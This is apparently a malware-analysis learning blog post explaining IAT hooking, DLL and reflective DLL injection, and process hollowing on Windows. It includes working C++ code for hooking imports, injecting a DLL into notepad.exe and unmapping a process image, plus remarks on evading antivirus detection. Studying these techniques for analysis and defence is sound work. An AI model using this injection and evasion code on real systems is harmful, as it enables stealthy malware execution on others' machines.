---
title: IAT Hooking, Process Injection & Process Hollowing
published: 2025-05-29
description: A simple blog about IAT Hooking, Process Injection & Process Hollowing, may you found what you need here <3
tags: [IAT, Process Injection, Process Hollowing, Blogging]
category: Blog
draft: false
---
# IAT Hooking, Process Injection & Process Hollowing

## Import Address Table Hooking

### Overview

Windows portable executable contains a structure called Import Address Table (IAT), IAT Hooking is a technique that overwriting the target DLL function's address with a rogue function address and optionally to execute the originally intended function.

### Analysis

IAT hooking pretty much work like the picture below,instead of jump to the address of the MessageBoxA in user32.dll it will jump to the Malicious code first then after executing that code, it will jump to the MessageBoxA in user32.dll.

![alt text](/IAT_PI_PH_Asset/images/image.png)

**Note: it's actually user32.dll not kernel32 my bad.**

Before going further into the technical stuff, let's understand a bit about Import Address Table, IAT is a table that contains the address of imported functions from DLLs. When a program is loaded into memory, the operating system resolves the addresses of these functions and fills in the IAT with the actual addresses. This allows the program to call these functions without needing to know their addresses at compile time.

below here is the structure of the IDT (Import Directory Table).

```C
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;    // 0 for terminating null import descriptor
        DWORD   OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;          // 0 if not bound,
                                    // -1 if bound, and real date\time stamp
                                    //in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
                                    //O.W. date/time stamp of DLL bound to (Old BIND)

    DWORD   ForwarderChain;         // -1 if no forwarders
    DWORD   Name;
    DWORD   FirstThunk;             // RVA to IAT (if bound this IAT has actual addresses)
} IMAGE_IMPORT_DESCRIPTOR;
typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
```

The `IMAGE_IMPORT_DESCRIPTOR` structure contains information about the imported functions and their addresses. The `OriginalFirstThunk` field points to the original unbound IAT, which contains the names of the imported functions and the `FirstThunk` field points to the actual IAT, which contains the addresses of the imported functions.

![alt text](/IAT_PI_PH_Asset/images/image-10.png)

And the Actual IAT structure is like this:

```c
typedef struct _IMAGE_THUNK_DATA64 {
    union {
        ULONGLONG ForwarderString;  // PBYTE 
        ULONGLONG Function;         // PDWORD
        ULONGLONG Ordinal;
        ULONGLONG AddressOfData;    // PIMAGE_IMPORT_BY_NAME
    } u1;
} IMAGE_THUNK_DATA64;
typedef IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64;

------------------------------------------------------------

typedef struct _IMAGE_THUNK_DATA32 {
    union {
        DWORD ForwarderString;  // PBYTE 
        DWORD Function;         // PDWORD
        DWORD Ordinal;
        DWORD AddressOfData;    // PIMAGE_IMPORT_BY_NAME
    } u1;
} IMAGE_THUNK_DATA32;
typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;
```

The `IMAGE_THUNK_DATA` structure contains information about the imported functions and their addresses. 

1. The `Function` field points to the address of the imported function.

2. The `AddressOfData` field points to the name of the imported function.

3. The `ForwarderString` field is used for forwarders, which are functions that are forwarded from one DLL to another. (this will be used when we have to use a pointer point to another DLL that contains the actual implementation of the function)

4. The `Ordinal` field is used for functions that are imported by ordinal number instead of by name.

The `AddressOfData` field is used to point to the `IMAGE_IMPORT_BY_NAME` structure, which contains the name of the imported function and its ordinal number.

The `IMAGE_IMPORT_BY_NAME` structure is used to represent the name of an imported function and its ordinal number. It contains the following fields:

```c
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;                // Hint for the function name
    CHAR    Name[1];            // Function name
} IMAGE_IMPORT_BY_NAME;
typedef IMAGE_IMPORT_BY_NAME UNALIGNED *PIMAGE_IMPORT_BY_NAME;
```

The `Hint` field is used to provide a hint for the function name, while the `Name` field contains the actual name of the imported function.

Windows loader can use both Hint or Name to resolve the address of the imported function. The loader will first check the `Hint` field, and if it is not found, it will use the `Name` field to resolve the address.

While the `Name` field sound convenient but it has a downside, the `Name` field is not always present in the IAT. In some cases, the `Name` field may be replaced with a forwarder string, which is a pointer to another DLL that contains the actual implementation of the function, not only that using `Hint` field can avoid comparing string since it is much faster when comparing int.

In conclusion the `IMAGE_IMPORT_DESCRIPTOR` structure is used to represent the imported functions and their addresses in the IAT. The `OriginalFirstThunk` field points to the original unbound IAT, which contains the names of the imported functions, while the `FirstThunk` field points to the actual IAT, which contains the addresses of the imported functions.

You may see now the `OriginalFirstThunk` and `FirstThunk` are actually the same, but when the program is loaded into memory, the operating system resolves the addresses of these functions and fills in the IAT with the actual addresses. This allows the program to call these functions without needing to know their addresses at compile time.

So the question here, what if we overwritten that address (FirstThunk) with our own function address? Here I have a breakpoint at MessageboxA, and I will hook it with my own function that contains the malicious code that I have prepared. The function will be called `hookedMessageBox` and it will be called instead of the original `MessageBoxA` function. Remember the original Address, it's `00007ffc40a68b70`.

![alt text](/IAT_PI_PH_Asset/images/image-8.png)

If you do a bit of calculating you will see this is the correct MessageBoxA's RVA in the EAT of `User32.dll`

![alt text](/IAT_PI_PH_Asset/images/image-9.png)

![alt text](/IAT_PI_PH_Asset/images/image-11.png)

I have here is an example of a function that use to hook the original function with the targeted function that has the malicious code that I have prepared.


```C++
void HookIAT(string function) {
    LPVOID imageBase = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);
    LPCSTR libraryName = NULL;
    HMODULE library = NULL;
    PIMAGE_IMPORT_BY_NAME functionName = NULL;

    while (importDescriptor->Name != NULL)
    {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)imageBase;
        library = LoadLibraryA(libraryName);

        if (library)
        {
            PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
            originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk);
            firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk);

            while (originalFirstThunk->u1.AddressOfData != NULL)
            {
                functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData);

                // find function address
                if (string(functionName->Name).compare(function) == 0)
                {
                    SIZE_T bytesWritten = 0;
                    DWORD oldProtect = 0;
                    VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);
                    firstThunk->u1.Function = (DWORD_PTR)hookedMessageBox; //overwritten address
                }
                ++originalFirstThunk;
                ++firstThunk;
            }
        }

        importDescriptor++;
    }
}
```

Now after running again the program, you will see the address of the `MessageBoxA` has been changed to the address of the `hookedMessageBox` function. The `hookedMessageBox` function will be called instead of the original `MessageBoxA` function. I will show it in IDA debugging since it way more clearer then using Windbg for this problem. You can see the address of the `MessageBoxA` before the hooking, it's `0x7ffb71698b70`.

![alt text](/IAT_PI_PH_Asset/images/image-1.png)

![alt text](/IAT_PI_PH_Asset/images/image-2.png)

Okay let's go over the Hooking function, rechecking the address of the `MessageBoxA` now, you will see the different, the address now will be `0x7ff7a28516c0` instead of the original one.

![alt text](/IAT_PI_PH_Asset/images/image-3.png)

If we step into the instruction where it called the MessageBoxA after got hooked it will jump to the malicious function that I have talked about earlier instead of the original user32.dll MessageBoxA.

![alt text](/IAT_PI_PH_Asset/images/image-4.png)

Those value in the `OriginalThunk` of those API are the address of them in the DLL, I already explain about them above and if you are wondering how to calculate the raw address from RVA it's `raw = (RVA - Section.VirtualAddress) + Section.PointerToRawData`

![alt text](/IAT_PI_PH_Asset/images/image-6.png)

So pretty much that its but you may notice one thing that Mentioned above too, it's the `thunk` field, right now it may have the same value as `originalthunk` but when it got loaded into a process the value will be changing into the address of the API when loaded. So we can use this value by overwritten it with the address of the malicious function that we have prepared.

## Process Injection

### Overview

Process injection is a technique used by malware to execute code in the address space of another process. This allows the malware to run in the context of the target process, making it harder to detect and analyze.

Process injection can be used to bypass security measures, such as antivirus software, by executing code in a trusted process. This technique is often used in conjunction with other techniques, such as process hollowing or DLL injection.

### Analysis

![alt text](/IAT_PI_PH_Asset/images/image-12.png)

The Injector will find the target process and allocate memory in the target process's address space. Then, it will write the DLL into the allocated memory. Finally, it will create a remote thread in the target process to execute the DLL.

This script I took from `iamaleks`, you can check his repo out for the full script, [here](https://github.com/iamaleks/Reflective-DLL-Injection-Example)

```C++
void InjectDLL(DWORD processID, const wchar_t* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        return;
    }

    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPath) {
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, pDllPath, dllPath, pathSize, NULL)) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Load the DLL into remote process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"),
        pDllPath, 0, NULL);

    if (!hThread) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD remoteBase = 0;
    GetExitCodeThread(hThread, &remoteBase);
    CloseHandle(hThread);

    if (!remoteBase) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    DWORD funcOffset = GetExportOffset(dllPath, "SusExportedFunction");
    if (!funcOffset) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    LPVOID remoteFuncAddr = (LPVOID)(remoteBase + funcOffset);
    HANDLE hFuncThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteFuncAddr, NULL, 0, NULL);

    if (!hFuncThread) {
    }
    else {
        WaitForSingleObject(hFuncThread, INFINITE);
        CloseHandle(hFuncThread);
    }

    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}
```

Running the program will create a new thread in the target process and execute the DLL. The DLL will be mapped into the target process's address space, and the code in the DLL will be executed in the context of the target process.

We can valid this by checking the memory inside the notepad process, you will see the DLL that we injected into the target process.

![alt text](/IAT_PI_PH_Asset/images/image-13.png)

![alt text](/IAT_PI_PH_Asset/images/image-14.png)

This is still can be detected easily since I used the `CreateRemoteThread` API to create a new thread in the target process. This API is often monitored by antivirus software and can be used to detect process injection attempts.

To bypass this detection, we can use a technique called "manual mapping" to inject the DLL into the target process without using the `CreateRemoteThread` API. This technique involves manually mapping the DLL into the target process's address space and resolving the addresses of the imported functions.'

Moreover without using `Kernel32.dll` and `CreateRemoteThread` API, we still can inject the DLL into the target process. This technique is called "Reflective DLL Injection" and is often used by malware to inject code into a target process without being detected.

```C++
void ReflectiveInjection(LPCSTR injectDLLPath) {
	HANDLE hDLLPayload = CreateFileA(injectDLLPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDLLPayload == INVALID_HANDLE_VALUE) {
		string errorMessage = GetLastErrorAsString();
		cout << errorMessage << "\n";
		return;
	}

	DWORD dllPayloadSize = GetFileSize(hDLLPayload, NULL);
	PIMAGE_DOS_HEADER pDLLPayloadInHeap = (PIMAGE_DOS_HEADER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllPayloadSize);
	if (pDLLPayloadInHeap == NULL) {
		string errorMessage = GetLastErrorAsString();
		cout << errorMessage << "\n";
		return;
	}

	if (!ReadFile(hDLLPayload, pDLLPayloadInHeap, dllPayloadSize, NULL, NULL)) {
		string errorMessage = GetLastErrorAsString();
		cout << errorMessage << "\n";
		return;
	}


	// 2. Find offset of the ReflectiveLoader export (The PE file will be parsed as if it is on disk)

	PIMAGE_NT_HEADERS64 pImageNTHeaders = (PIMAGE_NT_HEADERS64)(pDLLPayloadInHeap->e_lfanew + (LPBYTE)pDLLPayloadInHeap);
	PIMAGE_OPTIONAL_HEADER64 pImageOptionalHeader = &pImageNTHeaders->OptionalHeader;


	DWORD virtualAddressOfExportDirectory = pImageOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)ConvertRVAToOffset(pDLLPayloadInHeap, virtualAddressOfExportDirectory);

	DWORD numberOfNames = pExportDirectory->NumberOfNames;
	DWORD* pAddressOfNames = (DWORD*)ConvertRVAToOffset(pDLLPayloadInHeap, pExportDirectory->AddressOfNames);
	DWORD reflectiveLoaderExportOffset = 0;

	for (DWORD i = 0; i < numberOfNames; i++) {
		char* currentExportFunctionName = (char*)ConvertRVAToOffset(pDLLPayloadInHeap, pAddressOfNames[i]);

		if (strcmp(currentExportFunctionName, "YourExportFunctionName") == 0) {
			WORD* pAddressOfNameOrdinals = (WORD*)ConvertRVAToOffset(pDLLPayloadInHeap, pExportDirectory->AddressOfNameOrdinals);
			WORD currentExportFunctionOrdinal = pAddressOfNameOrdinals[i];

			DWORD* pAddressOfFunction = (DWORD*)ConvertRVAToOffset(pDLLPayloadInHeap, pExportDirectory->AddressOfFunctions);
			DWORD reflectiveLoaderRVA = pAddressOfFunction[currentExportFunctionOrdinal];

			reflectiveLoaderExportOffset = (DWORD)(ConvertRVAToOffset(pDLLPayloadInHeap, reflectiveLoaderRVA) - (ULONG_PTR)pDLLPayloadInHeap);

			break;
		}
	}

	if (reflectiveLoaderExportOffset == 0) {
		printf("Failed to locate ReflectiveLoader export\n");
		return;
	}

	// 3. Open handle to forign process, allocate a RW buffer to fit the dll payload

	// Find PID of Target Process
	LPCWSTR injectionTargetProcess = L"notepad.exe";
	DWORD injectionTargetProcessID = GetProcessIdByName((LPWSTR)injectionTargetProcess);

	if (injectionTargetProcessID == -1) {
		wprintf(L"Could not find process: %ls", injectionTargetProcess);
		return;
	}

	wprintf(L"Injecting into %ls (%d)\n", injectionTargetProcess, injectionTargetProcessID);

	HANDLE hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, injectionTargetProcessID);
	if (hTargetProcess == NULL) {
		string errorMessage = GetLastErrorAsString();
		cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return;
	}

	LPVOID remoteBuffer = VirtualAllocEx(hTargetProcess, NULL, dllPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteBuffer == NULL) {
		string errorMessage = GetLastErrorAsString();
		cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return;
	}

	if (!WriteProcessMemory(hTargetProcess, remoteBuffer, (LPVOID)pDLLPayloadInHeap, dllPayloadSize, NULL)) {
		string errorMessage = GetLastErrorAsString();
		cout << "Failed to aquire handle to process: " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return;
	}

	// 4. VirtualProtext the buffer to be RX
	DWORD oldProtect = 0;
	if (!VirtualProtectEx(hTargetProcess, remoteBuffer, dllPayloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
		string errorMessage = GetLastErrorAsString();
		cout << "Failed to set memory region to RX: " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return;
	}

	// 5. Create a remote thread that will run the ReflectiveLoader in the forign process

	LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)((LPBYTE)remoteBuffer + reflectiveLoaderExportOffset);

	HANDLE hThread = CreateRemoteThread(hTargetProcess, NULL, 0, lpStartAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		string errorMessage = GetLastErrorAsString();
		cout << "Remote thread failed " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return;
	}

	printf("Injection is complete");

	return;
}
```

## Process Hollowing

### Overview

Process hollowing is a technique used by malware to inject code into a target process by creating a new process in a suspended state and then replacing its memory with the malicious code. This allows the malware to run in the context of the target process, making it harder to detect and analyze.

### Analysis

![alt text](/IAT_PI_PH_Asset/images/image-15.png)

The evil.exe will create or find a new process in a suspended state (usually is create because if it find a running process to hollow then it is more likely a process injection instead of hollowing), allocate memory in the target process's address space, write the malicious code into the allocated memory, and then resume the target process to execute the malicious code.

```C++
// Unmap destination image base
NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
myNtUnmapViewOfSection(destProcess, (PVOID)destImageBase);

// Allocate memory at destination image base
LPVOID newDestImageBase = VirtualAllocEx(destProcess, (LPVOID)destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!newDestImageBase) {
	cout << "VirtualAllocEx failed.\n";
	return 1;
}
destImageBase = (SIZE_T)newDestImageBase;

// Calculate delta for relocations
LONGLONG deltaImageBase = (LONGLONG)destImageBase - (LONGLONG)ntHeaders64->OptionalHeader.ImageBase;

// Update ImageBase in headers
ntHeaders64->OptionalHeader.ImageBase = (ULONGLONG)destImageBase;

// Write headers to target
WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, ntHeaders64->OptionalHeader.SizeOfHeaders, NULL);
```

Before un-mapping:

![alt text](/IAT_PI_PH_Asset/images/image-16.png)

After un-mapping:

![alt text](/IAT_PI_PH_Asset/images/image-17.png)

The image contain the path to the notepad.exe completely gone then it will write a new memory into the process, if you look carefully the new memory got written into the same address as the original notepad.exe location.

![alt text](/IAT_PI_PH_Asset/images/image-18.png)

finally it will resume the process to execute the malicious code.

![alt text](/IAT_PI_PH_Asset/images/image-19.png)

all the source code will be in this [folder](https://github.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/tree/main/Asset/IAT_PI_PH_Asset/Script)

![Thanks](https://raw.githubusercontent.com/raviyelna/Journey-into-the-Fundamental-of-Malware-Analysing/refs/heads/main/Asset/Zani_gif/working.gif)



**reference**

[@Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection/)

[@iamaleks](https://github.com/iamaleks/Reflective-DLL-Injection-Example)

https://posts.thinkbox.dev/reflective-dll-injection/